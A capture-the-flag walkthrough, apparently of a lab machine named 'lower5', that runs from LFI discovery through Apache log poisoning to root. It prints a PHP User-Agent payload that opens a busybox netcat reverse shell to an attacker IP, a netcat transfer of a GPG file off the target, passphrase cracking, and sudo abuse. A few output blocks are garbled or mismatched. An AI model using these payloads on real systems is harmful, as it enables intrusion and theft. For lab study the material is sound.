# 🔍 Network Discovery

First, scan the local network to identify active hosts using `arp-scan`.

```bash
sudo arp-scan --localnet
```

## Result

```bash
$ sudo arp-scan  --localnet

# 🔎 Enumeration

## Nmap Scan

Perform a full TCP port scan:

```bash
nmap -n -Pn -sSV -p- --min-rate 5000 192.168.29.107
```

## Scan Results

### Observation

The website hosted a page related to web services with multiple navigation options.

Inspecting the page source revealed the following parameter:

<img width="1072" height="534" alt="Screenshot 2026-05-13 215041" src="https://github.com/user-attachments/assets/3dc740ec-9621-4266-965b-acdafe318c02" />

```html
<li><a href="page.php?inc=about.html">About</a></li>
```

This suggested a possible **Local File Inclusion (LFI)** vulnerability.

---

# ⚠️ Local File Inclusion (LFI)

Test the parameter using `/etc/passwd`:

```text
http://192.168.29.107/page.php?inc=/etc/passwd
```

<img width="1080" height="528" alt="Screenshot 2026-05-13 215349" src="https://github.com/user-attachments/assets/a53ca318-9c8e-4273-94df-bf74c3afd7d1" />

## Result

The contents of `/etc/passwd` were successfully displayed, confirming the LFI vulnerability.

---

# 🔍 LFI Fuzzing

Use `ffuf` with the SecLists LFI wordlist:

```bash
ffuf -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt \
-u "http://192.168.29.107/page.php?inc=FUZZ" -fs 52

curl: (23) Failure writing output to destination, passed 10136 returned 2092
```
The application was logging HTTP requests in real time.

This indicated the possibility of **Apache Log Poisoning**.

---

# 🎧 Netcat Listener

Start a Netcat listener on the attacker machine:

```bash
nc -lvnp 443
```

---

# 💣 Apache Log Poisoning

Inject PHP code into the Apache access log through the `User-Agent` header:

```bash
curl -s -H "User-Agent: <?php system('busybox nc 192.168.29.56 443 -e /bin/sh'); ?>" \
"http://192.168.29.107/"
```

The payload was successfully written into the log file.

---

# 🚀 Remote Code Execution

Trigger the poisoned log file through the browser:

```text
http://192.168.29.107/page.php?inc=/var/log/apache2/access.log
```

A reverse shell was successfully received.

---

# 🖥 Initial Access

## Verify User

```bash
id ; whoami
```

## Result

```bash
$ nc -lnvp 443           
listening on [any] 443 ...
connect to [192.168.29.56] from (UNKNOWN) [192.168.29.107] 47254
$ id ;whoami
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
```

Successfully gained access as the `www-data` user.

---

# 🔧 Upgrading to a Fully Interactive [TTY](https://www.geeksforgeeks.org/linux-unix/tty-command-in-linux-with-examples/)

Upgrade the shell for better interaction.

## Spawn Bash Shell

```bash
script /dev/null -c bash
```

Press:

```text
Ctrl + Z
```

## Configure Terminal

```bash
stty raw -echo; fg
```
This command sets the terminal to raw mode and brings the backgrounded Netcat session back to the foreground.
```bash
reset xterm
```

```bash
export TERM=xterm
```

```bash
export BASH=bash
```

The shell is now fully interactive.

---

# ⚠️ Sudo Enumeration (www-data)

Check sudo permissions:

```bash
sudo -l
```

## Result

```text
www-data@lower5:/var/www/html$ sudo -l
Matching Defaults entries for www-data on lower5:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on lower5:
    (low) NOPASSWD: /usr/bin/bash
```

### Important Finding
The `www-data` user can execute `/usr/bin/bash` as user `low` without a password.

---

# 🔓 Switching to User `low`

Execute bash as the `low` user:

```bash
sudo -u low /usr/bin/bash
```

## Verification

```bash
id ; whoami
```

## Result

```bash
www-data@lower5:/var/www/html$ sudo -u low /usr/bin/bash
low@lower5:/var/www/html$ id ; whoami
uid=1000(low) gid=1000(low) groups=1000(low)
low

```

Successfully switched to user `low`.

---

# ⚠️ Sudo Enumeration (low)

Check sudo permissions again:

```bash
sudo -l
```

## Result

```text
low@lower5:~$ sudo -l
Matching Defaults entries for low on lower5:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User low may run the following commands on lower5:
    (root) NOPASSWD: /usr/bin/pass
```

### Important Finding
The `low` user can execute the password manager `pass` as root.

---

# 🔍 Password Store Enumeration

Run the password manager:

```bash
sudo -u root /usr/bin/pass
```

## Result

```text
low@lower5:~$ sudo -u root /usr/bin/pass
Password Store
`-- root
    `-- password 
```

Attempt to access the stored password:

```bash
sudo -u root /usr/bin/pass root/password
```

The application requested a GPG passphrase.

---

# 📁 Discovering GPG File

Navigate to the `low` user's home directory:

```bash
low@lower5:/var/www/html$ cd /home/low/
low@lower5:~$ ls
root.gpg  user.txt
```

A GPG-encrypted file named `root.gpg` was discovered.

---

# 📤 Transferring the GPG File

## On Target Machine

```bash
nc 192.168.29.56 4444 < root.gpg
```

## On Attacker Machine

```bash
nc -lvnp 4444 > root.gpg
```

Successfully transferred the file.

---

# 🔓 Cracking the GPG Passphrase

Convert the GPG file into John format:

```bash
gpg2john root.gpg > hash
```

Crack the passphrase using John the Ripper:

```bash
$ john hash --wordlist=/usr/share/wordlists/rockyou.txt       
Created directory: /home/arc/.john
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])

Session completed. 
```

## Result

```text
Password1
```

The GPG passphrase was successfully recovered.

---

# 🔑 Retrieving the Root Password

Run the password manager again:

```bash
sudo -u root /usr/bin/pass root/password
```

Enter the passphrase:

```text
Password1
```

## Result

```text
r00tP@zzW0rD123
```

Successfully recovered the root password.

---

# 👑 Privilege Escalation

Switch to the root user:

```bash
su -
```

Enter password:

```text
r00tP@zzW0rD123
```

## Verification

```bash
id ; whoami
```

## Result

```bash
root@lower5:~# id ; whoami  
uid=0(root) gid=0(root) grupos=0(root)
root 
```

Successfully escalated privileges to root.
